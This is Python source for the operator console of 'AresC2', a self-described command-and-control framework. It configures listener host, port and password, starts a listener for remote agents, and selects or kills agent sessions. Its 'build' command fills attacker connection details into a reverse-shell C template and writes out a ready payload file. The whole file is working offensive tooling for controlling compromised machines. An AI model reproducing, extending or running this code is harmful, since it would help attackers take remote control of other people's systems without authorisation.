#!/usr/bin/python3

try:
    import readline
except ImportError:
    import pyreadline as readline
import os
import sys
from time import sleep
import signal
import random
import string

import AresC2_helper
import AresC2_listener

OPTIONS = { "lhost": "0.0.0.0", "lport": 5555, "password": "Auth" }
code = ""

BANNER = r"""
    ________________________
    `'-.,________,,..-  ___ \________
       > `'-.,_____,,.-`<_>\ )__     `\
         >            `'-._    _)____  \
          >          _.-'`  _______  `\ |
           >   _,,..--'''```       `'-.\|
Ares-C2    >-'``                        `'
"""

MSG = """
\x1b[35mAresC2 [TCP] - A Structured Python C2 Framework
Usage  : Use 'help' to see available commands.\x1b[0m
"""


def handle_session_commands(OPTIONSELECTED):
    if OPTIONSELECTED == "jobs":
        if not AresC2_listener.ProcessList:
            print("[*] No active background jobs running.")
        else:
            counter = 1
            for x, y in AresC2_listener.ProcessList.items():
                print(f"{counter}. PID: {x} || {y}")
                counter += 1

    elif OPTIONSELECTED == "killall":
        try:
            for x, y in AresC2_listener.AgentParentChildBucket.items():
                for u, v in y.items():
                    u.send("exit\n")
            sleep(1)
            for x, y in AresC2_listener.ProcessList.items():
                print(f"[x] Killing {y}")
                os.kill(int(x), signal.SIGKILL)
            AresC2_listener.ProcessList.clear()
        except Exception as ex:
            print(f"[x] Unable to kill the Agent: {ex}")

    elif OPTIONSELECTED.startswith("kill"):
        parts = OPTIONSELECTED.split(" ")
        if len(parts) != 2:
            print("[x] PID not found in active process list.")
        else:
            try:
                target_pid = int(parts[1])
                if target_pid in AresC2_listener.ProcessList:
                    target_name = AresC2_listener.ProcessList[target_pid]
                    if target_name in AresC2_listener.AgentParentChildBucket:
                        for u, v in AresC2_listener.AgentParentChildBucket[target_name].items():
                            u.send("exit\n")
                else:
                    print("[x] Target PID not found in active jobs.")
            except Exception as ex:
                print(f"[x] Unable to kill Agent: {ex}")

    elif OPTIONSELECTED.startswith("select"):
        parts = OPTIONSELECTED.split(" ")
        if len(parts) != 2:
            print("[x] Invalid Agent selected")
        else:
            target_agent = parts[1]
            if target_agent in AresC2_listener.AgentParentChildBucket:
                AresC2_listener.AgentSelector(target_agent)
            else:
                print("[x] Unable to access the Agent")


def handle_config_commands(OPTIONSELECTED):
    global code
    
    # دعم صيغتي الإدخال المباشرة أو المسبوقة بكلمة set
    if "lhost" in OPTIONSELECTED:
        parts = OPTIONSELECTED.split(" ")
        # إذا استخدمت صيغة "set lhost 192.168.1.1" يكون الطول 3، وإذا "lhost 192.168.1.1" يكون الطول 2
        val_index = 2 if "set" in parts else 1
        if len(parts) <= val_index:
            print("[x] Cannot set an empty listner host")
        else:
            try:
                OPTIONS["lhost"] = parts[val_index]
                print(f"[+] Listener host set as {OPTIONS['lhost']}\n")
            except Exception as ex:
                print(f"[x] Invalid host: {ex}\n")

    elif "password" in OPTIONSELECTED:
        parts = OPTIONSELECTED.split(" ")
        val_index = 2 if "set" in parts else 1
        if len(parts) <= val_index:
            print("[x] Cannot set an empty flag for verification")
        else:
            try:
                OPTIONS["password"] = parts[val_index]
                print(f"[+] Flag verification set to {OPTIONS['password']}\n")
            except Exception as ex:
                print(f"[x] Invalid flag: {ex}\n")

    elif "lport" in OPTIONSELECTED:
        parts = OPTIONSELECTED.split(" ")
        val_index = 2 if "set" in parts else 1
        if len(parts) <= val_index:
            print("[x] Cannot set an empty listner port")
        else:
            try:
                OPTIONS["lport"] = int(parts[val_index])
                print(f"[+] Listener port set as {OPTIONS['lport']}\n")
            except Exception as ex:
                print(f"[x] Invalid port: {ex}\n")

    elif "build" in OPTIONSELECTED:
        try:
            with open("Template/Revshell.c", mode="r") as f:
                code = f.read()
            
            code = code.replace("Authentication_Password", OPTIONS["password"])
            code = code.replace("Replace_With_LHOST", OPTIONS["lhost"])
            code = code.replace("Replace_With_LPORT", str(OPTIONS["lport"]))
            
            res = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
            with open(f"{res}.c", mode="w") as f:
                f.write(code)
            print(f"[+] {res}.c Generated successfully")
        except Exception as ex:
            print(f"[x] Build failed: {ex}")


def main():
    readline.parse_and_bind("tab: complete")
    readline.set_completer(AresC2_helper.HelpCommandCompletion)

    while True:
        try:
            OPTIONSELECTED = input(f"Ares-C2 [\x1b[31m{OPTIONS['lhost']}:{OPTIONS['lport']}:{OPTIONS['password']}\x1b[0m]$ ").strip()
            
            if OPTIONSELECTED == "":
                continue

            elif OPTIONSELECTED == "exit":
                break

            elif OPTIONSELECTED == "help":
                AresC2_helper.Help()

            elif OPTIONSELECTED == "back":
                print("[!] You are already at the main console.")

            elif OPTIONSELECTED == "run":
                if not OPTIONS["lhost"] or not OPTIONS["lport"]:
                    print("[x] Cannot start listener! Atleast one parameter is invalid/empty!")
                else:
                    AresC2_listener.Listener(OPTIONS["lhost"], OPTIONS["lport"], OPTIONS["password"])

            elif OPTIONSELECTED in ["jobs", "killall"] or OPTIONSELECTED.startswith(("kill", "select")):
                handle_session_commands(OPTIONSELECTED)

            # معالجة المدخلات سواء بدأت بكلمة set أو بدأت بأسماء المتغيرات مباشرة
            elif OPTIONSELECTED.startswith("set") or OPTIONSELECTED.startswith(("lhost", "password", "lport", "build")):
                handle_config_commands(OPTIONSELECTED)

            elif OPTIONSELECTED.split(" ")[0] not in AresC2_helper.HelpCommands:
                print("\033[91m[x] Invalid option. RTFM!\n\033[0m")

        except KeyboardInterrupt:
            print("\n[!] Use exit option to quit AresC2!\n")
            
    sys.exit(0)


if __name__ == '__main__':
    print(BANNER)
    print(MSG)
    main()
